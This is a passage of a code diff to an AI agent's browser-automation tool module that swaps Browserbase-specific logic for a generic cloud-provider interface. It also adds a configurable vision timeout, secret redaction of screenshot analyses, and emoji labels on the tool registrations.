+        return camofox_vision(question, annotate, task_id)
+
     import base64
     import uuid as uuid_mod
     from pathlib import Path
@@ -1455,8 +1675,8 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     effective_task_id = task_id or "default"
     
     # Save screenshot to persistent location so it can be shared with users
-    hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
-    screenshots_dir = hermes_home / "browser_screenshots"
+    from hermes_constants import get_hermes_dir
+    screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
     screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
     
     try:
@@ -1475,12 +1695,12 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
             effective_task_id, 
             "screenshot", 
             screenshot_args,
-            timeout=30
         )
         
         if not result.get("success"):
             error_detail = result.get("error", "Unknown error")
-            mode = "local" if _is_local_mode() else "cloud"
+            _cp = _get_cloud_provider()
+            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
             return json.dumps({
                 "success": False,
                 "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
@@ -1492,7 +1712,8 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
 
         # Check if screenshot file was created
         if not screenshot_path.exists():
-            mode = "local" if _is_local_mode() else "cloud"
+            _cp = _get_cloud_provider()
+            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
             return json.dumps({
                 "success": False,
                 "error": (
@@ -1521,6 +1742,20 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         vision_model = _get_vision_model()
         logger.debug("browser_vision: analysing screenshot (%d bytes)",
                      len(image_data))
+
+        # Read vision timeout from config (auxiliary.vision.timeout), default 120s.
+        # Local vision models (llama.cpp, ollama) can take well over 30s for
+        # screenshot analysis, so the default must be generous.
+        vision_timeout = 120.0
+        try:
+            from hermes_cli.config import load_config
+            _cfg = load_config()
+            _vt = _cfg.get("auxiliary", {}).get("vision", {}).get("timeout")
+            if _vt is not None:
+                vision_timeout = float(_vt)
+        except Exception:
+            pass
+
         call_kwargs = {
             "task": "vision",
             "messages": [
@@ -1534,15 +1769,19 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
             ],
             "max_tokens": 2000,
             "temperature": 0.1,
+            "timeout": vision_timeout,
         }
         if vision_model:
             call_kwargs["model"] = vision_model
         response = call_llm(**call_kwargs)
         
-        analysis = response.choices[0].message.content
+        analysis = (response.choices[0].message.content or "").strip()
+        # Redact secrets the vision LLM may have read from the screenshot.
+        from agent.redact import redact_sensitive_text
+        analysis = redact_sensitive_text(analysis)
         response_data = {
             "success": True,
-            "analysis": analysis,
+            "analysis": analysis or "Vision analysis returned no content.",
             "screenshot_path": str(screenshot_path),
         }
         # Include annotation data if annotated screenshot was taken
@@ -1610,48 +1849,6 @@ def _cleanup_old_recordings(max_age_hours=72):
 # Cleanup and Management Functions
 # ============================================================================
 
-def _close_browserbase_session(session_id: str, api_key: str, project_id: str) -> bool:
-    """
-    Close a Browserbase session immediately via the API.
-    
-    Uses POST /v1/sessions/{id} with status=REQUEST_RELEASE to immediately
-    terminate the session without waiting for keepAlive timeout.
-    
-    Args:
-        session_id: The Browserbase session ID
-        api_key: Browserbase API key
-        project_id: Browserbase project ID
-        
-    Returns:
-        True if session was successfully closed, False otherwise
-    """
-    try:
-        # POST to update session status to REQUEST_RELEASE
-        response = requests.post(
-            f"https://api.browserbase.com/v1/sessions/{session_id}",
-            headers={
-                "X-BB-API-Key": api_key,
-                "Content-Type": "application/json"
-            },
-            json={
-                "projectId": project_id,
-                "status": "REQUEST_RELEASE"
-            },
-            timeout=10
-        )
-        
-        if response.status_code in (200, 201, 204):
-            logger.debug("Successfully closed BrowserBase session %s", session_id)
-            return True
-        else:
-            logger.warning("Failed to close session %s: HTTP %s - %s", session_id, response.status_code, response.text[:200])
-            return False
-                
-    except Exception as e:
-        logger.error("Exception closing session %s: %s", session_id, e)
-        return False
-
-
 def cleanup_browser(task_id: Optional[str] = None) -> None:
     """
     Clean up browser session for a task.
@@ -1692,15 +1889,14 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
             _active_sessions.pop(task_id, None)
             _session_last_activity.pop(task_id, None)
         
-        # Cloud mode: close the Browserbase session via API
-        if bb_session_id and not _is_local_mode():
-            try:
-                config = _get_browserbase_config()
-                success = _close_browserbase_session(bb_session_id, config["api_key"], config["project_id"])
-                if not success:
-                    logger.warning("Could not close BrowserBase session %s", bb_session_id)
-            except Exception as e:
-                logger.error("Exception during BrowserBase session close: %s", e)
+        # Cloud mode: close the cloud browser session via provider API
+        if bb_session_id:
+            provider = _get_cloud_provider()
+            if provider is not None:
+                try:
+                    provider.close_session(bb_session_id)
+                except Exception as e:
+                    logger.warning("Could not close cloud browser session: %s", e)
         
         # Kill the daemon process and clean up socket directory
         session_name = session_info.get("session_name", "")
@@ -1763,18 +1959,20 @@ def check_browser_requirements() -> bool:
     Returns:
         True if all requirements are met, False otherwise
     """
+    # Camofox backend — only needs the server URL, no agent-browser CLI
+    if _is_camofox_mode():
+        return True
+
     # The agent-browser CLI is always required
     try:
         _find_agent_browser()
     except FileNotFoundError:
         return False
 
-    # In cloud mode, also require Browserbase credentials
-    if not _is_local_mode():
-        api_key = os.environ.get("BROWSERBASE_API_KEY")
-        project_id = os.environ.get("BROWSERBASE_PROJECT_ID")
-        if not api_key or not project_id:
-            return False
+    # In cloud mode, also require provider credentials
+    provider = _get_cloud_provider()
+    if provider is not None and not provider.is_configured():
+        return False
 
     return True
 
@@ -1790,7 +1988,8 @@ if __name__ == "__main__":
     print("🌐 Browser Tool Module")
     print("=" * 40)
 
-    mode = "local" if _is_local_mode() else "cloud (Browserbase)"
+    _cp = _get_cloud_provider()
+    mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
     print(f"   Mode: {mode}")
     
     # Check requirements
@@ -1803,12 +2002,9 @@ if __name__ == "__main__":
         except FileNotFoundError:
             print("   - agent-browser CLI not found")
             print("     Install: npm install -g agent-browser && agent-browser install --with-deps")
-        if not _is_local_mode():
-            if not os.environ.get("BROWSERBASE_API_KEY"):
-                print("   - BROWSERBASE_API_KEY not set (required for cloud mode)")
-            if not os.environ.get("BROWSERBASE_PROJECT_ID"):
-                print("   - BROWSERBASE_PROJECT_ID not set (required for cloud mode)")
-            print("   Tip: unset BROWSERBASE_API_KEY to use free local mode instead")
+        if _cp is not None and not _cp.is_configured():
+            print(f"   - {_cp.provider_name()} credentials not configured")
+            print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")
     
     print("\n📋 Available Browser Tools:")
     for schema in BROWSER_TOOL_SCHEMAS:
@@ -1833,6 +2029,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
     handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="🌐",
 )
 registry.register(
     name="browser_snapshot",
@@ -1841,27 +2038,31 @@ registry.register(
     handler=lambda args, **kw: browser_snapshot(
         full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
     check_fn=check_browser_requirements,
+    emoji="📸",
 )
 registry.register(
     name="browser_click",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_click"],
-    handler=lambda args, **kw: browser_click(**args, task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="👆",
 )
 registry.register(
     name="browser_type",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_type"],
-    handler=lambda args, **kw: browser_type(**args, task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="⌨️",
 )
 registry.register(
     name="browser_scroll",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
-    handler=lambda args, **kw: browser_scroll(**args, task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="📜",
 )
 registry.register(
     name="browser_back",
@@ -1869,6 +2070,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_back"],
     handler=lambda args, **kw: browser_back(task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="◀️",
 )
 registry.register(
     name="browser_press",
@@ -1876,6 +2078,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_press"],
     handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="⌨️",
 )
 registry.register(
     name="browser_close",
@@ -1883,6 +2086,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_close"],
     handler=lambda args, **kw: browser_close(task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="🚪",
 )
 registry.register(
     name="browser_get_images",
@@ -1890,6 +2094,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
     handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="🖼️",
 )
 registry.register(
     name="browser_vision",
@@ -1897,6 +2102,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_vision"],
     handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="👁️",
 )
 registry.register(
     name="browser_console",
@@ -1904,4 +2110,5 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_console"],
     handler=lambda args, **kw: browser_console(clear=args.get("clear", False), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
+    emoji="🖥️",
 )
